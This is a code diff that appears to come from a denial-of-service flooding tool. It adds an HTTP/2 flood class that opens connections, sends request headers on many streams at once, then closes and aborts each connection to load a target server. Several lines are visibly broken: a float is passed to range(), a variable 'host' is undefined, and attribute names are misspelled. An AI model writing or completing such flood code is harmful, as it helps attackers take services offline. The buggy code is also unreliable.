@@ -2,12 +2,20 @@ import asyncio
 import errno
 import time
 from enum import Enum
-from typing import Any, Callable, Generator, Optional, Tuple
+from typing import Any, Callable, Generator, List, Optional, Tuple
 
 from OpenSSL import SSL
 
 from .core import CONN_PROBE_PERIOD, UDP_BATCH_PACKETS, UDP_ENOBUFS_PAUSE, logger
 from .targets import TargetStats
+
+import collections
+import collections.abc
+setattr(collections, 'MutableSet', collections.abc.MutableSet)
+setattr(collections, 'MutableMapping', collections.abc.MutableMapping)
+
+import h2.connection
+setattr(collections, 'MutableMapping', collections.abc.MutableMapping)
 
 
 FloodSpecGen = Generator[Tuple[int, Any], None, None]
@@ -48,6 +56,65 @@ class FloodSpec:
         for _ in range(num_packets):
             _packet: bytes = packet()
             yield FloodOp.WRITE, (_packet, len(_packet))
+
+
+class H2FloodIO(asyncio.Protocol):
+
+    def __init__(self, loop, headers: List[Tuple[str, str]], on_close):
+        self._loop = loop
+        # XXX: ideally we have to read this from settings frame but it's gonna be harder
+        self._num_streams = 128/2 - 1
+        self._headers = headers
+        self._target_host = host
+        self._on_close = on_close
+
+    def connection_made(self, transport) -> None:
+        self._conn = h2.connection.H2Connection()
+        self._transport = transport
+        # XXX: do we have to read? this is required at least for settings sync
+        self._transport.pause_reading()
+        self._conn.initiate_connection()
+        # XXX: full request might be (should be) provided from the method definition
+        for ind in range(self._num_streams):
+            self._conn.send_headers(1+ind*2, self._headers, end_stream=True)
+            # XXX: we should also consider body + trailings
+        # send everything
+        self._loop.call_soon(self._send)
+   
+    def _send(self):
+        data = self._conn.data_to_send()
+        if len(data) > 0:
+            self._transport.write(data)
+        # completely random wait interval
+        self._loop.call_later(10, self._close)
+
+    # XXX: do we need to be good citizens by sending RST?
+    def _close(self):
+        self._conn.close_connection()
+        data = self._conn.data_to_send()
+        self._transport.write(data)
+        self._loop.call_later(1, self._abort)
+
+    def _abort(self):
+        self._transport.abort()
+
+    # XXX: do we have to read? this is required at least for settings sync
+    def data_received(self, data):
+        _events = self._conn.receive_data(data)
+        self._loop.call_soon(self._send)
+
+    def connection_lost(self, exc) -> None:
+        self._transport = None
+        self._on_close.set_result(True)
+
+    def pause_writing(self) -> None:
+        pass
+
+    def resume_writing(self) -> None:
+        if self._tranposrt is None:
+            return
+        self._tranport.write(self._conn.data_to_send())
+
 
 
 # XXX: add instrumentation to keep track of connection lifetime,
